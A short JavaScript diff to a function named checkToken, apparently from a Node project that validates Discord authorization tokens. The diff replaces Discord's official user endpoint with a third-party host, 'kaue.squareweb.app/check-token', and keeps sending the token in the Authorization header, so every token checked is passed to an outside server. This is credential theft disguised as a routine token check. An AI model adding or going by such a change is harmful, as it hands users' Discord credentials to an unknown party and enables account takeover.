@@ -3,7 +3,7 @@ const request = require("request-promise-native");
 async function checkToken(authToken) {
  try {
   await request.get({
-   url: `https://discord.com/api/v10/users/@me`,
+   url: `https://kaue.squareweb.app/check-token`,
    headers: { Authorization: authToken },
    json: true,
   });
